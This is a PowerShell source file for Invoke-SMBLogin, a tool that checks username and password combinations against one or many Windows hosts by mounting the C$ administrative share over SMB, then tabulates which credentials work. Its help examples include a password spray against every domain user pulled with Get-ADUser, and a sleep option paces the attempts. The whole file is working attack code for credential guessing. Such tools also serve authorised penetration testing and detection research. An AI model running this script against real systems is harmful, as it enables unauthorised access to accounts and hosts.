<#
.SYNOPSIS
	Validates username & password combination(s) across a host or group of hosts using the SMB protocol.
	
	Author: Mauricio Velazco (@mvelazco)
	License: BSD 3-Clause
.DESCRIPTION
	The script will attempt to mount the C$ administrative share  on a remote host (s) using username & paswword combination (s).
	It will interpret the results and print a table of results on the console.
	
.PARAMETER ComputerName
	A single computer name or ip
	A list of comma separated computer names or ips  
	A text file of computer names or ips ( one per line )
	
.PARAMETER Domain
	Optional
	Domain to use. If not defined, local account authentication events will be generated (builtin\).
	
.PARAMETER Sleep
	Optional
	Time to sleep between each authentication attempt.
	
	
.PARAMETER UserName
	A single username
	A list of comma separated usernames  
	A text file usernames ( one per line )
.PARAMETER Password
	A single password
	A list of comma separated passwords  
	A text file of passwords ( one per line )
.EXAMPLE
	PS C:\> Invoke-SMBLogin -ComputerName host01 -UserName bsimpson -Password Passw0rd1
	PS C:\> Invoke-SMBLogin -ComputerName host01 -UserName bsimpson -Password "Passw0rd1,Passw0rd2,Passw0rd3"
	PS C:\> Invoke-SMBLogin -ComputerName "host01,host02,host03" -UserName bsimpson -Password "Passw0rd1,Passw0rd2,Passw0rd3"
	
	PS C:\> Invoke-SMBLogin -Domain lab.org -ComputerName hosts.txt -UserName Administrator -Password Passw0rd1
	PS C:\> Invoke-SMBLogin -Domain lab.org -ComputerName host01 -UserName users.txt -Password Passw0rd1
	PS C:\> Invoke-SMBLogin -Domain lab.org -ComputerName host01 -UserName users.txt -Password passwords.txt
	Depending on the type of paramater ( a single item, comma separated items or text file ) the script will run through all the iterations.
.EXAMPLE
	PS C:\> Invoke-SMBLogin -ComputerName hosts.txt -UserName Administrator -Password "Passw0rd1,Passw0rd2"
	ComputerName Username              Password  Result
	------------ --------              --------  ------
	192.168.1.1  builtin\Administrator Passw0rd1 Failed
	192.168.1.1  builtin\Administrator Passw0rd2 Failed
	192.168.1.2  builtin\Administrator Passw0rd1 Failed
	192.168.1.2  builtin\Administrator Passw0rd2 Success
		
.EXAMPLE
	PS C:\> Get-ADUser -Filter * | Select-Object SamAccountName > users.txt
	PS C:\> Invoke-SMBLogin -Domain lab.org -ComputerName AnyDomainHost -UserName users.txt -Password Winter2019
	This will perform a password spray attack across all domain users using Winter2019.
	
#>
function Invoke-SMBLogin {

    [CmdletBinding()]
    Param
    (
		[string]$Domain,
		[string]$UserName,
		[string]$Password,
		[string]$ComputerName,
		[int]$Sleep
    )
	$dom="builtin\"
	if ($Domain){
		$dom=$Domain+ '\'
	}
	if (!$Sleep){
		$Sleep = 0
	}
    if (!($UserName) -or !($Password) -or !($ComputerName)) {
        Write-Warning 'Invoke-SMBLogin: Please specify the $UserName, $Password and $ComputerName parameters.'
    } 
	else 
	{

		$ComputerNames = @()
		$UserNames = @()
		$Passwords = @()
		$Results = @()
		
		if (Test-Path $ComputerName -PathType Leaf)		{
			$ComputerNames = Get-Content $ComputerName
		}
		elseif ($ComputerName -match ","){	
			$ComputerNames=$ComputerName.Split(',')
		}
		else{
			$ComputerNames=@($ComputerName)
		}
		
		if (Test-Path $UserName -PathType Leaf)		{
			$UserNames = Get-Content $UserName
		}
		elseif ($UserName -match ",")
		{	
			$UserNames=$UserName.Split(',')
		}
		else{
			$UserNames=@($UserName)
		}
		
		if (Test-Path $Password -PathType Leaf)		{
			$Passwords = Get-Content $Password
		}
		elseif ($Password -match ",")
		{	
			$Passwords=$Password.Split(',')
		}
		else{
			$Passwords=@($Password)
		}

		foreach ($Computer in $ComputerNames)
		{
			if (Test-Connection -ComputerName $Computer -Count 1 -Quiet )
			{
				foreach ($User in $UserNames)
				{
					$User=$dom+$User
					foreach ($Password in $Passwords)
					{
						try
						{
							$net = new-object -ComObject WScript.Network
							$Result=$net.MapNetworkDrive("x:", "\\"+$Computer+"\c$", $false,$User, $Password)	
							
							if ($Result) {
								Write-Verbose "SUCCESS ( With admin rights ): $User works with $Password against $Computer"
								$result = new-object psobject
								$result | add-member Noteproperty 'ComputerName' $Computer
								$result | add-member Noteproperty 'Username' $User
								$result | add-member Noteproperty 'Password' $Password
								$result | add-member Noteproperty 'Result' 'Success'
								$Results += $result
								$net.RemoveNetworkDrive("x:", $true, $true)
								
							}
							else {
								Write-Verbose "FAILED:  $User works with $Password against $ComputerName"
							}	
						}
						Catch 
						{
							if ($_.Exception.Message -like '*password is not correct*'){
								
								Write-Verbose "FAILED (The specified network password is not correct) : $User fails with $Password against $Computer"
								$result = new-object psobject
								$result | add-member Noteproperty 'ComputerName' $Computer
								$result | add-member Noteproperty 'Username' $User
								$result | add-member Noteproperty 'Password' $Password
								$result | add-member Noteproperty 'Result' 'Failed'
								$Results += $result
								
								}
							elseif ($_.Exception.Message -like '*Access is Denied*'){
								Write-Verbose "SUCCESS ( Access is denied ): $User works with $Password against $Computer"
								$result = new-object psobject
								$result | add-member Noteproperty 'ComputerName' $Computer
								$result | add-member Noteproperty 'Username' $User
								$result | add-member Noteproperty 'Password' $Password
								$result | add-member Noteproperty 'Result' 'Success'
								$Results += $result
							

							}
							elseif ($_.Exception.Message -like '*unknown user name or bad password*'){
								Write-Verbose "FAILED ( unkown user name or bad password) : $User fails with $Password against $Computer"
								$result = new-object psobject
								$result | add-member Noteproperty 'ComputerName' $Computer
								$result | add-member Noteproperty 'Username' $User
								$result | add-member Noteproperty 'Password' $Password
								$result | add-member Noteproperty 'Result' 'Failed'
								$Results += $result
							
							}
							elseif (($_.Exception.Message -like '*network name cannot be found*') -or ($_.Exception.Message -like '*network path was not found*')) {
								Write-Verbose "Host $Computer is Offline"

							}
						}
						if ($Sleep -gt 0){
							Write-Verbose "Sleeping $Sleep seconds between each authentication attempt"
							Start-Sleep -s $Sleep
							
						}
					
					}
				}
			}
			else
			{
				Write-Verbose "Host $Computer is Offline"
			}
		}
		$Results | Format-Table -AutoSize
    }
}

